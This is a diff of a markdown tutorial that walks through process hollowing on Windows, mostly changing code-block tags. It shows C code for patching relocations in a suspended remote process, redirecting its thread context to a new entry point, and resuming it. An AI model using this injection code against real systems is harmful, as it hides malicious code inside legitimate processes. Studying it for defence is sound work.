@@ -353,7 +353,7 @@ so this part is a little bit sneaky, we just check if the delta (dwDelta) is equ
 
 1. **Get the Address of the Relocation Section's Raw Data**
 
-    ```c
+    ```cpp
     DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
     DWORD dwOffset = 0;
     ```
@@ -361,7 +361,7 @@ We start by initializing the address and offset for reading the relocation data.
 
 2. **Get the Relocation Data Directory**
 
-    ```c
+    ```cpp
     IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
     ```
 This retrieve the relocation data directory from the PE file's optional header. This directory contains information about the relocation data size and virtual address.
@@ -370,7 +370,7 @@ Now lets start processing each relocation block
 
 3. **Process Relocation Data**
 
-    ```c
+    ```cpp
     while (dwOffset < relocData.Size)
     ```
 
@@ -379,7 +379,7 @@ Now lets start processing each relocation block
 
 4. **Get the Relocation Block Header**
 
-    ```c
+    ```cpp
     PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
     dwOffset += sizeof(BASE_RELOCATION_BLOCK);
     ```
@@ -388,7 +388,7 @@ now we accessing the header of the current relocation block and update the offse
 
 5. **Calculate Number of Relocation Entries**
 
-    ```c
+    ```cpp
     DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
     PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];
     ```
@@ -397,14 +397,14 @@ After we got the `pBlockheader`, lets determine the number of relocation entries
 
 6. **Process Each Relocation Entry**
 
-    ```c
+    ```cpp
     for (DWORD y = 0; y < dwEntryCount; y++)
     ```
 Iterating through each relocation entry in the current block. `dwEntryCount` gives the number of entries to process. The loop index `y` is used to access each entry.
 
 7. **Skip Non-Relocatable Entries**
 
-    ```c
+    ```cpp
     dwOffset += sizeof(BASE_RELOCATION_ENTRY);
     if (pBlocks[y].Type == 0)
         continue;
@@ -415,14 +415,14 @@ Now after we get access to the entries, we should adjust adresses.
 
 8. **Calculate the Address to be Relocated**
 
-    ```c
+    ```cpp
     DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
     ```
 Starting by calculating the address that needs adjustment. The `dwFieldAddress` is calculated by adding the `PageAddress` from the block header to the `Offset` from the entry.
 
 9. **Read the Value at the Address**
 
-    ```c
+    ```cpp
     DWORD dwBuffer = 0;
     ReadProcessMemory(
         pProcessInfo->hProcess, 
@@ -437,7 +437,7 @@ Now lets read the current value from the target process memory. The `ReadProcess
 
 10. **Adjust the Value by the Relocation Delta**
 
-    ```c
+    ```cpp
     dwBuffer += dwDelta;
     ```
 
@@ -445,7 +445,7 @@ Now lets read the current value from the target process memory. The `ReadProcess
 
 11. **Write the Adjusted Value Back**
 
-    ```c
+    ```cpp
     BOOL bSuccess = WriteProcessMemory(
         pProcessInfo->hProcess,
         (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
@@ -459,7 +459,7 @@ Write the adjusted value back to the process memory. `WriteProcessMemory` update
 
 12. **Check if Write Was Successful**
 
-    ```c
+    ```cpp
     if (!bSuccess)
     {
         printf("Error writing memory\r\n");
@@ -482,7 +482,7 @@ Lets implement this,
 
 The following section of the code sets a breakpoint at the entry point of the PE file. This is done conditionally with the `#ifdef WRITE_BP` directive.
 
-```c
+```cpp
 #ifdef WRITE_BP
 printf("Writing breakpoint\r\n");
 
@@ -503,7 +503,7 @@ The code within #ifdef WRITE_BP is included only if WRITE_BP is defined and the 
 
 Passing now to managing the thread context, After setting the breakpoint, the code retrieves and sets the thread context to modify the instruction pointer to the entry point of the PE file.
 
-```
+```cpp
 LPCONTEXT pContext = new CONTEXT();
 pContext->ContextFlags = CONTEXT_INTEGER;
 
@@ -524,4 +524,19 @@ if (!SetThreadContext(pProcessInfo->hThread, pContext))
     printf("Error setting context\r\n");
     return;
 }
+```
+this steps involves managing the thread context to ensure proper execution of the relocated code. First, a new CONTEXT structure is allocated and initialized with CONTEXT_INTEGER to indicate that the integer registers are being modified. The GetThreadContext function is then called to retrieve the current context of the thread. Once the context is retrieved, the EAX register is set to the entry point address (dwEntrypoint), effectively setting the instruction pointer to the entry point of the relocated code. The SetThreadContext function is then used to update the thread context with these modified values. Throughout this process, any errors encountered while getting or setting the thread context are handled by printing error messages and returning from the function to ensure that issues are promptly addressed.
+
+The last step, after setting all, we can resume the main thread.
+
+```cpp
+printf("Resuming thread\r\n");
+
+if (!ResumeThread(pProcessInfo->hThread))
+{
+    printf("Error resuming thread\r\n");
+    return;
+}
+
+printf("Process hollowing complete\r\n");
 ```
